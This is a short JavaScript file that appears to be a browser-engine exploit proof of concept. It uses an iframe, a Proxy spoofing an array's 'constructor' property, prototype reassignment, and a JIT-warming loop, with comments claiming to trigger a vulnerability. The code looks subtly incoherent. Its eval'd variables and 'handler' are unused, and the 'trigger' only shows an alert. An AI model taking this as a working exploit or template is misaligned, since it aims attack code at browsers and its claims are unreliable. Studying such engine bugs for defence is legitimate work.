function main() {
    let o = document.body.appendChild(document.createElement('iframe')).contentWindow;

    // Prototype Pollution
    o.eval(`
        let base = {};
        let arr = [1, 2, 3];
        arr.__proto__ = base;
    `);

    let arr = [1.1, 2.2];
    let arr2 = [1.1, 2.2];

    let proto = new o.Object();
    let handler = {};

    // Extending prototype chain using Proxy
    proto.__proto__ = new Proxy({}, {
        get(target, property) {
            if (property === 'constructor') {
                return Array;  // Manipulating constructor property
            }
            return target[property];
        }
    });

    arr2.__proto__ = proto;

    for (let i = 0; i < 10000; i++) {
        // Performing some operations on arrays
        arr.concat(arr2);
        arr.reverse();
        arr2.push(i);
    }

    // Triggering the vulnerability
    setTimeout(() => {
        alert(arr.constructor);  // Alerting the manipulated constructor property
    }, 500);
}

main();
